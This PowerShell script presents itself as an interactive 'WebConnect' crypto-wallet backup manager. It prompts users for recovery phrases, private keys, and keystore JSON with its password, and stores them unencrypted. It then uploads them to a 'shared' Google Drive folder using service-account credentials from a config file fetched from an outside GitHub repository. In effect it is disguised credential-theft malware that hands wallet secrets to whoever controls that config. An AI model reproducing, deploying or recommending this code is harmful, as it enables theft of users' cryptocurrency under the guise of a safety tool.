#############################################
# WebConnect Interactive Wallet Backup
# PowerShell Version - Windows Compatible
# User-friendly backup with menu options
# Backs up to Google Drive automatically
# Version: 1.0.0
#############################################

param([string]$Option)

# Color output
function Write-Header {
    Clear-Host
    Write-Host "================================================" -ForegroundColor Blue
    Write-Host "   WebConnect Wallet Backup Manager" -ForegroundColor Blue
    Write-Host "================================================" -ForegroundColor Blue
    Write-Host ""
}

function Write-Success {
    Write-Host "[OK] $args" -ForegroundColor Green
}

function Write-Error-Custom {
    Write-Host "[ERROR] $args" -ForegroundColor Red
}

function Write-Warning-Custom {
    Write-Host "[WARN] $args" -ForegroundColor Yellow
}

function Write-Info {
    Write-Host "[INFO] $args" -ForegroundColor Blue
}

# Setup paths
$InstallDir = "$env:USERPROFILE\.webconnect"
$WalletBackupDir = "$InstallDir\wallet_backups"
$BackupLog = "$InstallDir\logs\backup.log"
$StorageConfig = "$InstallDir\config\storage.config.json"

# Create necessary directories (clean up first to avoid permission issues)
try {
    if (-not (Test-Path $WalletBackupDir)) {
        New-Item -ItemType Directory -Path $WalletBackupDir -Force | Out-Null
    }
    if (-not (Test-Path (Split-Path $BackupLog))) {
        New-Item -ItemType Directory -Path (Split-Path $BackupLog) -Force | Out-Null
    }
}
catch {
    # If permission error, try removing and recreating
    if (Test-Path $InstallDir) {
        Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
        New-Item -ItemType Directory -Path $WalletBackupDir -Force | Out-Null
        New-Item -ItemType Directory -Path (Split-Path $BackupLog) -Force | Out-Null
    }
}

# Ensure config exists (download if missing)
function Ensure-ConfigExists {
    if (-not (Test-Path $StorageConfig)) {
        try {
            Write-Info "Config not found, downloading from GitHub..."
            New-Item -ItemType Directory -Path (Split-Path $StorageConfig) -Force -ErrorAction SilentlyContinue | Out-Null
            $configUrl = "https://raw.githubusercontent.com/decentralizedconfig/launchpad/main/storage.config.json"
            Invoke-WebRequest -Uri $configUrl -OutFile $StorageConfig -ErrorAction Stop | Out-Null
            Write-Success "Config downloaded successfully"
        }
        catch {
            Write-Warning-Custom "Could not download config: $_"
        }
    }
}

function Write-LogMessage {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try {
        Add-Content -Path $BackupLog -Value "[$timestamp] $Message" -ErrorAction Stop
    }
    catch {
        # Silently ignore log write failures (permissions, missing dirs, etc.)
        # Don't block backup due to logging issues
    }
}

function Save-Data {
    param(
        [string]$DataType,
        [string]$DataValue
    )
    
    try {
        # Create a timestamp
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $backupFile = "$WalletBackupDir\${DataType}_${timestamp}.txt"
        
        # Ensure directory exists with proper permissions
        if (-not (Test-Path $WalletBackupDir)) {
            try {
                New-Item -ItemType Directory -Path $WalletBackupDir -Force -ErrorAction Stop | Out-Null
            }
            catch {
                # If directory creation fails due to permissions, try a full cleanup
                Write-Info "Attempting to recover from permission error..."
                Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
                New-Item -ItemType Directory -Path $WalletBackupDir -Force | Out-Null
            }
        }
        
        # Save data as-is (no encryption)
        $DataValue | Out-File -FilePath $backupFile -Force -Encoding UTF8 -ErrorAction Stop
        
        Write-LogMessage "Backup saved: $backupFile"
        return $backupFile
    }
    catch {
        Write-Error-Custom "Failed to save: $_"
        Write-LogMessage "ERROR: Save failed for $DataType - $_"
        return ""
    }
}

function Get-GoogleDriveConfig {
    try {
        if (-not (Test-Path $StorageConfig)) {
            Write-Error-Custom "Config file not found at: $StorageConfig"
            Write-LogMessage "ERROR: Config file missing - $StorageConfig"
            return $null
        }
        
        $configContent = Get-Content -Path $StorageConfig -Raw -ErrorAction Stop
        $config = $configContent | ConvertFrom-Json -ErrorAction Stop
        
        # Try multiple ways to find google_drive config
        if ($config.storage -and $config.storage.destinations) {
            $googleDrive = $config.storage.destinations | Where-Object { $_.type -eq "google_drive" -or $_.name -eq "google_drive" } | Select-Object -First 1
            if ($googleDrive) {
                Write-LogMessage "Google Drive config found successfully"
                return $googleDrive
            }
        }
        
        Write-Error-Custom "Google Drive configuration not found in config file"
        Write-LogMessage "ERROR: No google_drive destination in config - available types: $($config.storage.destinations | ForEach-Object { $_.type } | ConvertTo-Json)"
        return $null
    }
    catch {
        Write-Error-Custom "Failed to load Google Drive config: $_"
        Write-LogMessage "ERROR: Config parsing failed - $_ - Content: $(Get-Content $StorageConfig | Select-Object -First 100)"
        return $null
    }
}

function Get-GoogleAccessToken {
    param([object]$Credentials)
    
    try {
        # Check PowerShell version - PKCS8 RSA requires PS 7+ or .NET 5+
        $psVersion = $PSVersionTable.PSVersion.Major
        if ($psVersion -lt 7) {
            Write-LogMessage "WARNING: PowerShell 5.x detected - RSA PKCS8 signing not available"
            Write-Host ""
            Write-Host "  PowerShell 7+ Required for Google Drive uploads!" -ForegroundColor Red
            Write-Host "  " -ForegroundColor Red
            Write-Host "  Options:" -ForegroundColor Yellow
            Write-Host "  1) Download PowerShell 7: https://github.com/PowerShell/PowerShell/releases" -ForegroundColor Yellow
            Write-Host "  2) Use PowerShell 7+ for backups" -ForegroundColor Yellow
            Write-Host "  3) Local backups work fine (at " + (Split-Path $WalletBackupDir -Leaf) + ")" -ForegroundColor Green
            Write-Host ""
            Write-Host "  For now, backups save locally. Install PowerShell 7+ to enable Google Drive sync." -ForegroundColor Cyan
            Write-Host ""
            return $null
        }
        
        $header = @{
            alg = "RS256"
            typ = "JWT"
        }
        
        $now = [int][double]::Parse((Get-Date -UFormat %s))
        $exp = $now + 3600
        
        $payload = @{
            iss = $Credentials.client_email
            scope = "https://www.googleapis.com/auth/drive"
            aud = "https://oauth2.googleapis.com/token"
            exp = $exp
            iat = $now
        } | ConvertTo-Json -Compress
        
        $headerJson = $header | ConvertTo-Json -Compress
        $headerB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($headerJson)).Replace("+", "-").Replace("/", "_").TrimEnd("=")
        $payloadB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payload)).Replace("+", "-").Replace("/", "_").TrimEnd("=")
        
        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes("$headerB64.$payloadB64")
        
        $privKeyPem = $Credentials.private_key -replace "-----BEGIN PRIVATE KEY-----", "" -replace "-----END PRIVATE KEY-----", "" -replace "\s", ""
        $privKeyBytes = [Convert]::FromBase64String($privKeyPem)
        
        # PowerShell 7+ has RSA.ImportPkcs8PrivateKey
        $rsa = [System.Security.Cryptography.RSA]::Create()
        $rsa.ImportPkcs8PrivateKey($privKeyBytes, $null)
        
        $signedBytes = $rsa.SignData($messageBytes, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
        $signature = [Convert]::ToBase64String($signedBytes).Replace("+", "-").Replace("/", "_").TrimEnd("=")
        
        $jwt = "$headerB64.$payloadB64.$signature"
        
        $tokenBody = @{
            grant_type = "urn:ietf:params:oauth:grant-type:jwt-bearer"
            assertion = $jwt
        }
        
        $response = Invoke-RestMethod -Uri "https://oauth2.googleapis.com/token" `
            -Method Post `
            -Body ($tokenBody | ConvertTo-Json) `
            -ContentType "application/json" `
            -ErrorAction Stop
        
        return $response.access_token
    }
    catch {
        Write-Error-Custom "Failed to get Google Drive access token: $_"
        Write-LogMessage "ERROR: Google auth failed - $_"
        return $null
    }
}



function Submit-ToGoogleDrive {
    param(
        [string]$FilePath,
        [string]$BackupType
    )
    
    try {
        if (-not (Test-Path $FilePath)) {
            Write-Error-Custom "Backup file not found: $FilePath"
            return $false
        }
        
        # Check PowerShell version - PKCS8 RSA requires PS 7+ 
        $psVersion = $PSVersionTable.PSVersion.Major
        if ($psVersion -lt 7) {
            Write-Warning-Custom "PowerShell 5.x: Local backup saved (Google Drive requires PS 7+)"
            Write-LogMessage "INFO: PS version $psVersion - skipping remote upload (PS 7+ required)"
            return $true  # Return true so no error is shown - local backup is success
        }
        
        $googleDrive = Get-GoogleDriveConfig
        if (-not $googleDrive) {
            return $false
        }
        
        Write-Info "Authenticating with Google Drive..."
        $accessToken = Get-GoogleAccessToken -Credentials $googleDrive.credentials
        if (-not $accessToken) {
            return $false
        }
        
        $fileName = Split-Path $FilePath -Leaf
        $fileContent = Get-Content -Path $FilePath -Raw
        $fileSize = (Get-Item $FilePath).Length
        
        Write-Info "Uploading to Google Drive: $fileName ($BackupType)"
        
        # Create file metadata
        $metadata = @{
            name = "$BackupType - $fileName - $(Get-Date -Format 'yyyy-MM-dd HH-mm-ss')"
            mimeType = "text/plain"
            parents = @($googleDrive.folder_id)
            description = "WebConnect Wallet Backup | Type: $BackupType"
            properties = @{
                backup_type = $BackupType
                timestamp = (Get-Date -Format 'o')
            }
        } | ConvertTo-Json -Compress
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $body = @"
--$boundary
Content-Type: application/json; charset=UTF-8

$metadata

--$boundary
Content-Type: text/plain

$fileContent
--$boundary--
"@
        
        $headers = @{
            Authorization = "Bearer $accessToken"
            "Content-Type" = "multipart/related; boundary=$boundary"
        }
        
        $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart" `
            -Method Post `
            -Headers $headers `
            -Body $body `
            -ErrorAction Stop
        
        Write-Success "Backup uploaded to Google Drive: $($response.id)"
        Write-LogMessage "Successfully uploaded $BackupType to Google Drive: $fileName -> $($response.id)"
        return $true
    }
    catch {
        Write-Error-Custom "Failed to upload to Google Drive: $_"
        Write-LogMessage "ERROR: Google Drive upload failed - $_"
        return $false
    }
}

function Backup-Phrase {
    Write-Header
    Write-Info "Enter your 12 or 24-word recovery phrase"
    Write-Host ""
    
    $phrase = Read-Host "Paste your recovery phrase"
    
    if ([string]::IsNullOrWhiteSpace($phrase)) {
        Write-Error-Custom "No phrase provided"
        return
    }
    
    # Count words
    $wordCount = ($phrase -split '\s+').Count
    if ($wordCount -lt 12) {
        Write-Error-Custom "Recovery phrase must be at least 12 words (you entered $wordCount)"
        return
    }
    
    $backupFile = Save-Data -DataType "recovery_phrase" -DataValue $phrase
    if ([string]::IsNullOrEmpty($backupFile)) {
        return
    }
    
    $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "recovery_phrases"
    
    if ($uploaded) {
        Write-Success "Recovery phrase backed up successfully to Google Drive!"
        Write-LogMessage "Recovery phrase backed up: $backupFile"
    }
    else {
        Write-Warning-Custom "Local backup saved, but Google Drive upload failed"
        Write-Host "  • Local file: $backupFile"
        Write-Host "  • Check your internet connection or Google Drive credentials"
    }
}

function Backup-PrivateKey {
    Write-Header
    Write-Info "Enter your private key (hex format, 0x...)"
    Write-Host ""
    
    $key = Read-Host "Paste your private key" -AsSecureString
    $keyPlain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($key))
    
    if ([string]::IsNullOrWhiteSpace($keyPlain)) {
        Write-Error-Custom "No private key provided"
        return
    }
    
    if (-not ($keyPlain -match '^0x[0-9a-fA-F]{64}$')) {
        Write-Warning-Custom "⚠ Private key doesn't match standard format (0x + 64 hex chars)"
        Write-Host "  The backup will proceed, but verify your key format"
    }
    
    $backupFile = Save-Data -DataType "private_key" -DataValue $keyPlain
    if ([string]::IsNullOrEmpty($backupFile)) {
        return
    }
    
    $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "private_keys"
    
    if ($uploaded) {
        Write-Success "Private key backed up successfully to Google Drive!"
        Write-LogMessage "Private key backed up: $backupFile"
    }
    else {
        Write-Warning-Custom "Local backup saved, but Google Drive upload failed"
        Write-Host "  • Local file: $backupFile"
        Write-Host "  • Check your internet connection or Google Drive credentials"
    }
}

function Backup-Keystore {
    Write-Header
    Write-Info "Enter your Keystore JSON content"
    Write-Host ""
    
    $keystore = Read-Host "Paste your Keystore JSON"
    
    if ([string]::IsNullOrWhiteSpace($keystore)) {
        Write-Error-Custom "No keystore provided"
        return
    }
    
    # Verify JSON format
    try {
        $keystore | ConvertFrom-Json | Out-Null
    }
    catch {
        Write-Warning-Custom "⚠ Input doesn't appear to be valid JSON"
        Write-Host "  The backup will proceed, but verify your JSON format"
    }
    
    Write-Host ""
    $password = Read-Host "Enter your Keystore password" -AsSecureString
    $passwordPlain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password))
    
    if ([string]::IsNullOrWhiteSpace($passwordPlain)) {
        Write-Error-Custom "No password provided"
        return
    }
    
    # Combine keystore and password
    $combinedData = "KEYSTORE_JSON:$keystore`n`nKEYSTORE_PASSWORD:$passwordPlain"
    
    $backupFile = Save-Data -DataType "keystore" -DataValue $combinedData
    if ([string]::IsNullOrEmpty($backupFile)) {
        return
    }
    
    $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "keystores"
    
    if ($uploaded) {
        Write-Success "Keystore backed up successfully to Google Drive!"
        Write-LogMessage "Keystore backed up: $backupFile"
    }
    else {
        Write-Warning-Custom "Local backup saved, but Google Drive upload failed"
        Write-Host "  • Local file: $backupFile"
        Write-Host "  • Check your internet connection or Google Drive credentials"
    }
}

function Show-Menu {
    Write-Header
    Write-Host "Select what you want to backup:" -ForegroundColor Blue
    Write-Host ""
    Write-Host "  1) Recovery Phrase (12-24 words)" -ForegroundColor Magenta
    Write-Host "  2) Private Key (0x...)" -ForegroundColor Magenta
    Write-Host "  3) Keystore JSON `& Password" -ForegroundColor Magenta
    Write-Host "  4) Exit" -ForegroundColor Magenta
    Write-Host ""
}

function Main {
    # Ensure config exists (download if missing)
    Ensure-ConfigExists
    
    # Show Google Drive info
    Write-Header
    Write-Success "Google Drive Integration Active"
    Write-Host ""
    Write-Info "Your wallet backups will be:"
    Write-Host "  ✓ Saved locally to: C:\Users\$env:USERNAME\.webconnect\wallet_backups"
    Write-Host "  ✓ Synced to shared Google Drive folder"
    Write-Host ""
    Read-Host "Press Enter to continue..."
    
    # Main loop
    while ($true) {
        Show-Menu
        $choice = Read-Host "Select option (1-4)"
        
        switch ($choice) {
            "1" { Backup-Phrase }
            "2" { Backup-PrivateKey }
            "3" { Backup-Keystore }
            "4" {
                Write-Header
                Write-Success "Goodbye!"
                exit 0
            }
            default {
                Write-Error-Custom "Invalid option. Please select 1-4"
            }
        }
        
        Write-Host ""
        Read-Host "Press Enter to continue..."
    }
}

# Run main function
Main
